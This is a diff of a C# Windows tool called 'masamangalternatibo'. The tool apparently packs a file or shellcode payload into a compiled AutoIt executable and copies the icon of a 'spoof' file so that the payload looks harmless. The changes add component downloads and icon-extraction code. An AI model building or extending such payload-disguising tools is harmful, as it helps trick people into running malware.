@@ -1,4 +1,4 @@
-﻿#define isdbg //NOTE: DO NOT FORGET TO UNDEFINE (comment out) THIS ON RELEASE.
+﻿//#define isdbg //NOTE: DO NOT FORGET TO UNDEFINE (comment out) THIS ON RELEASE.
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -12,6 +12,7 @@ using System.IO;
 using System.Diagnostics;
 using System.Net;
 using System.Drawing.IconLib;
+using System.Threading;
 
 //using System.Runtime.InteropServices;
 
@@ -22,11 +23,14 @@ namespace masamangalternatibo {
 
         string version = "1.0";
         bool payloadMode = true; // true = File payload // false = Shell Code payload
+        bool icolibexist = false;
         string lastPayloadContainer;
         int overflowCount = 20;
+        string apth = Application.StartupPath;
 
         private void Form1_Load(object sender, EventArgs e) {
             lblVersion.Text = "v" + version;
+            dbgmsg("Starting from: " + apth);
             loadDrives();
             checkComponents();
             #if !(isdbg)
@@ -41,19 +45,23 @@ namespace masamangalternatibo {
             #endif
         }
 
+        //Extract Icon Function - used to extract icons by utilizing the IconLib Library
         private void extractIcon(bool fromButton = false, string iconfile = "") {
             //fromButton supresses error if it wasn't the users' intention to extract an icon
-            if (iconfile != "") {
+            if (icolibexist && iconfile != "") {
                 dbgmsg("Extracting associated icon to bitmap...");
+                (Icon.ExtractAssociatedIcon(iconfile).ToBitmap()).Save(apth + "\\_bmptmp.bmp");
                 MultiIcon conico = new MultiIcon();
-                conico.Add("iconinstance").CreateFrom(Icon.ExtractAssociatedIcon(iconfile).ToBitmap(), IconOutputFormat.WinXP);
+                conico.Add("iconinstance").CreateFrom(apth + "\\_bmptmp.bmp", IconOutputFormat.WinXP);
                 conico.SelectedIndex = 0;
-                conico.Save(Application.StartupPath + "\\$temp.ico", MultiIconFormat.ICO);
+                conico.Save(apth + "\\$tmp.ico", MultiIconFormat.ICO);
                 imgFileIcon.ImageLocation = "$tmp.ico";
+                File.Delete(apth + "\\_bmptmp.bmp");
+                dbgmsg("Temporary bitmap file deleted.");
             }
             else {
                 if (fromButton) {
-                    MessageBox.Show("No spoof file imported", "Error");
+                    MessageBox.Show("No spoof file imported or Icon Library functions can't be utilized", "Error");
                 }
                 else {
                     dbgmsg("Error from un-intended extraction suppressed!");
@@ -61,6 +69,7 @@ namespace masamangalternatibo {
             }
         }
 
+        //Trim Extension Function - Removes the file extension from a string
         private string trimext(string flname) {
             string[] aa = flname.Split('.');
             string tmp = "";
@@ -114,14 +123,16 @@ namespace masamangalternatibo {
         }
         #endregion
 
+        //Check Component Function - Checks the required external components of mA
         private void checkComponents() {
-            #region [Component: Compiler]
+            string dl1 = "https://github.com/tragenalpha/masamangalternatibo/raw/master/Aut2Exe/compiler.exe"; //DL Link for the Compiler
+            string dl2 = "https://github.com/tragenalpha/masamangalternatibo/raw/master/IconLib/IconLib.dll"; //DL Link for the Library
             dbgmsg("Checking for compiler...");
             if (!(File.Exists("compiler.exe"))) {
-                if (MessageBox.Show("An important component of mA is missing!\n\nThe AutoIt compiler (compiler.exe) was not found, you cannot use mA with out the compiler as it needs to compile scripts to standalone executables.\n\nPressing Yes will download the compiler from this link\nhttps://github.com/tragenalpha/masamangalternatibo/raw/master/Aut2Exe/compiler.exe\n\nThis will be downloaded in the background.", "Script compiler missing! // Download component \"compiler.exe\" (1.32mb)", MessageBoxButtons.YesNo) == DialogResult.Yes) {
+                if (MessageBox.Show("An important component of mA is missing!\n\nThe AutoIt compiler (compiler.exe) was not found, you cannot use mA with out the compiler as it needs to compile scripts to standalone executables.\n\nPressing Yes will download the compiler from this link\n" + dl1 + "\n\nThis will be downloaded in the background.", "Script compiler missing! // Download component \"compiler.exe\" (1.32mb)", MessageBoxButtons.YesNo) == DialogResult.Yes) {
                     dbgmsg("Downloading file...");
                     using (WebClient _wc = new WebClient()) {
-                        _wc.DownloadFile("https://github.com/tragenalpha/masamangalternatibo/raw/master/Aut2Exe/compiler.exe", "compiler.exe");
+                        _wc.DownloadFile(dl1, "compiler.exe");
                     }
                     dbgmsg("Download complete!");
                     MessageBox.Show("Download complete!", "Download component \"compiler.exe\" (1.32mb)");
@@ -133,9 +144,34 @@ namespace masamangalternatibo {
                     return;
                 }
             }
+            else {
+                dbgmsg("compiler.exe found.");
             }
-            #endregion
-            
+
+            dbgmsg("Checking for IconLib...");
+            if (!(File.Exists("IconLib.dll"))) {
+                if (MessageBox.Show("An important component of mA is missing!\n\nThe IconLib (IconLib.dll) Library was not found, some functions that are used by this application relies on this library file such as handling Icon conversion.\n\nPressing Yes will download the Library from this link\n" + dl2 + "\n\nThis will be downloaded in the background.", "Library missing! // Download component \"IconLib.dll\" (56.5kb)", MessageBoxButtons.YesNo) == DialogResult.Yes) {
+                    dbgmsg("Downloading file...");
+                    using (WebClient _wc = new WebClient()) {
+                        _wc.DownloadFile(dl2, "IconLib.dll");
+                    }
+                    dbgmsg("Download complete!");
+                    MessageBox.Show("Download complete!", "Download component \"IconLib.dll\" (56.5kb)");
+                    icolibexist = true;
+                }
+                else {
+                    icolibexist = false;
+                    dbgmsg("WARNING: IconLib.dll is missing, some functions won't work without it.");
+                    return;
+                }
+            }
+            else {
+                icolibexist = true;
+                dbgmsg("IconLib.dll found.");
+            }
+        }
+        
+        //Debug Message Function - Function to be utilized to output messages in the debug console
         private void dbgmsg(string a) {
             lblDbg.Text = a;
             dbgRtb.Text = a + "\n" + dbgRtb.Text;
@@ -227,7 +263,7 @@ namespace masamangalternatibo {
 
         private void ofdSpoof_FileOk(object sender, CancelEventArgs e) {
             tbSpoof.Text = ofdSpoof.SafeFileName;
-            extractIcon(false, ofdSpoof.SafeFileName);
+            extractIcon(false, ofdSpoof.FileName);
         }
 
         private void btn3rdParty_Click(object sender, EventArgs e) {
